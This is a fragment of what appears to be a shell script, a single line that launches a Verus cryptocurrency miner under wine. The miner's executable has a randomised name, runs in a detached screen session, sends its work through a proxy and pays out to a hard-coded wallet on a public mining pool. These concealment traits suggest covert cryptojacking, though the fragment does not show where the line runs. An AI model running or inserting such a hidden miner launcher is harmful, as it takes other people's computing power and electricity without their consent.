...
screen -d -m bash -c "wine $random_name.exe -a verus -o stratum+tcp://na.luckpool.net:3956 -u REPNzMPtM7seJy5xngt5VWKXMsEi6Ejezb.beluttgacor -p d=8192S -t 4 --proxy=$proxy_url"
